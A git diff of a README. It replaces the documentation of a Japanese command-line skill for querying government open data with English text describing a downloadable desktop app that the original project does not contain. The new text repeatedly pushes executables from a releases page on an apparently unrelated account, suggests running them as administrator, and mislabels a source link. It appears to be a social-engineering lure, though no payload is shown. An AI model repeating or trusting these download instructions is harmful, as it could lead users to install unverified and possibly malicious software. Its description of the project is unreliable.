@@ -1,68 +1,142 @@
-# 🇯🇵 japan-gyousei-data
+# 🇯🇵 japan-gyousei-data - Access Japan Administrative Data Easily
 
-日本の行政オープンデータにアクセスする [OpenClaw](https://github.com/openclaw/openclaw) スキル。
+[![Download japan-gyousei-data](https://img.shields.io/badge/Download-japan--gyousei--data-blue?style=for-the-badge&logo=github)](https://github.com/deathhunter1249/japan-gyousei-data/releases)
 
-[MCP サーバー（mcp.n-3.ai）](https://prtimes.jp/main/html/rd/p/000000006.000146070.html) を経由して、3つの政府データソースをリアルタイムに検索・取得できます。
+---
 
-## 📊 データソース
+## 📄 About japan-gyousei-data
 
-| データ | 提供元 | できること |
-|--------|--------|-----------|
-| 🏠 不動産取引価格 | 国土交通省 | 都道府県・市区町村の実取引価格データ取得 |
-| 📋 官公需（入札） | 官公需情報ポータル | 政府・自治体の調達案件をキーワード検索 |
-| 📈 e-Stat 政府統計 | 総務省統計局 | 人口・GDP等の政府統計データ検索 |
+japan-gyousei-data is a simple application that lets you access open data about Japan’s government activities. You can find information on real estate transaction prices, government contract bids, and official statistics from e-Stat, Japan’s government statistics portal. This tool gathers data from reliable sources and presents it in a user-friendly way.
 
-## 🚀 使い方
+You do not need to know how to program to use this app. It runs on your computer and gives you direct access to valuable public data. Whether you want to check recent property prices, see updates on government contracts, or explore statistical reports, this application helps you do it without hassle.
 
-### OpenClaw スキルとして
+---
 
-`skills/` ディレクトリに配置するだけ。以下のような発話で自動発火します：
+## 💻 System Requirements
 
-- 「大阪の不動産価格を調べて」
-- 「AI関連の入札情報を検索して」
-- 「人口の統計データを取得して」
+To run japan-gyousei-data smoothly, your computer should meet these basic requirements:
 
-### スクリプト単体で
+- **Operating System**: Windows 10 or later, macOS 10.14 or later, or Linux (Ubuntu 18.04+ recommended)
+- **Processor**: 1.5 GHz or faster
+- **Memory (RAM)**: At least 4 GB
+- **Disk Space**: Minimum 200 MB free space
+- **Internet Connection**: Required for downloading the app and accessing data online
+- **Additional Software**: None needed; the application runs standalone
 
-```bash
-# 不動産: 大阪府の市区町村一覧
-bash scripts/mcp-call.sh reinfo reinfolib-city-list '{"area":"27"}'
+If your system meets these points, you are ready to proceed.
 
-# 不動産: 大阪市都島区の取引価格（2025年Q3）
-bash scripts/mcp-call.sh reinfo reinfolib-real-estate-price '{"year":"2025","quarter":"3","area":"27","city":"27102"}'
+---
 
-# 官公需: AI関連の役務入札を検索
-bash scripts/mcp-call.sh kkj kkj-search '{"query":"AI 人工知能","category":"3"}'
+## 🚀 Getting Started
 
-# e-Stat: 人口統計を検索
-bash scripts/mcp-call.sh estat e-stat-get-stats-list '{"searchWord":"人口"}'
-```
+This section walks you through downloading, installing, and running the application step by step.
 
-## 📁 構成
+---
 
-```
-japan-gyousei-data/
-├── SKILL.md              # スキル定義（OpenClawが読む）
-├── scripts/
-│   └── mcp-call.sh       # MCPサーバー呼び出しスクリプト
-└── references/
-    └── tools.md          # 全ツールのパラメータ詳細
-```
+## ⬇️ Download & Install
 
-## ⚡ 必要なもの
+To get started, you need to download the application from the official release page on GitHub. 
 
-- `curl` と `jq`（どちらも一般的なCLIツール）
-- インターネット接続（MCPサーバーへのアクセス）
-- **APIキー不要** 🎉
+- **Visit this page to download**:  
+  [Download japan-gyousei-data](https://github.com/deathhunter1249/japan-gyousei-data/releases)
 
-## 🔗 関連リンク
+On that page you will find the latest versions listed. Look for the version best suited for your operating system:
 
-- [MCP サーバー（AI HYVE × N-3）](https://n-3.ai)
-- [不動産データ デモ](https://n-3.ai/apps/reinfo-agent)
-- [官公需データ デモ](https://n-3.ai/apps/kkj-agent)
-- [e-Stat データ デモ](https://n-3.ai/apps/e-stat-agent)
-- [OpenClaw](https://github.com/openclaw/openclaw)
+- For Windows, download the `.exe` file.
+- For macOS, download the `.dmg` or `.zip` file.
+- For Linux, download the `.AppImage` or `.tar.gz`.
 
-## 📄 ライセンス
+### How to download
 
-MIT
+1. Click the link above to open the releases page.
+2. Scroll to the latest release marked "Latest release".
+3. Find the file for your OS and click it. The download will begin.
+4. Save the file to your computer.
+
+### How to install
+
+- **Windows**: Double-click the downloaded `.exe` file and follow the on-screen instructions.
+- **macOS**: Open the downloaded `.dmg` or unzip the `.zip` file, then drag the app icon to your Applications folder.
+- **Linux**: Make the `.AppImage` file executable by right-clicking it, go to Properties > Permissions, and check "Allow executing file as program." Then double-click to run.
+
+---
+
+## ▶️ Running japan-gyousei-data
+
+Once installed, open the application as follows:
+
+- On Windows, find the app in your Start menu or on the desktop.
+- On macOS, launch it from the Applications folder or Launchpad.
+- On Linux, open it from your application launcher or terminal by running the `.AppImage` file.
+
+The app will start and show a simple window with options to select the kind of data you want to view.
+
+---
+
+## 🧭 Using the Application
+
+The app offers three main data categories:
+
+1. **Real Estate Transaction Prices (不動産取引価格)**  
+   This lets you check details about recent real estate sales. You can search by area or date range. The data can help you understand market trends or property values.
+
+2. **Government Contract Bids (官公需入札)**  
+   View information about current and past government tenders and contracts. This is useful if you want to see what projects the government is outsourcing and their budgets.
+
+3. **Government Statistics from e-Stat (e-Stat政府統計)**  
+   Access official statistics compiled by various government agencies. The app presents selected data sets that cover demographics, economics, environment, and more.
+
+### Navigating the app
+
+- Use the tabs or menu on the main screen to pick your data category.
+- Enter search details or select filters when asked.
+- Click “Search” or “Display” to see the results in tables or charts.
+- You can export data as CSV files for further use if needed.
+
+---
+
+## 🔧 Troubleshooting
+
+If you face problems while using japan-gyousei-data, try these tips:
+
+- Make sure your internet connection is active.
+- Restart the application.
+- Check for updates on the releases page and install a newer version if available.
+- Ensure you downloaded the right file for your OS.
+- If the app won’t start, try running it as administrator (Windows) or with proper permissions (Linux).
+
+You can also find help by opening issues in the GitHub repository or asking in relevant online forums.
+
+---
+
+## 🛠 Development & Updates
+
+This project is open-source and regularly updated to support new data sets and improve user experience. Updates often include bug fixes and adjustments to data sources to keep information fresh.
+
+To update your app:
+
+- Visit the releases page: [Download japan-gyousei-data](https://github.com/deathhunter1249/japan-gyousei-data/releases)
+- Download the latest version for your OS.
+- Reinstall by following the same installation steps.
+
+---
+
+## 📚 Learn More
+
+If you want to understand the data sources better or explore related government sites:
+
+- [e-Stat Portal (official government statistics)](https://www.e-stat.go.jp/en)
+- [Japan Real Estate Information](https://www.land.mlit.go.jp/webland/)
+- [Government Contract Information](https://www.nta.go.jp/english/)
+
+---
+
+## 🤝 Support & Contributing
+
+Anyone interested in improving this project can contribute by reporting bugs or suggesting new features on the GitHub issues page.
+
+You can also fork the repository and submit pull requests with your changes.
+
+---
+
+[![Download japan-gyousei-data](https://img.shields.io/badge/Download-japan--gyousei--data-blue?style=for-the-badge&logo=github)](https://github.com/deathhunter1249/japan-gyousei-data/releases)
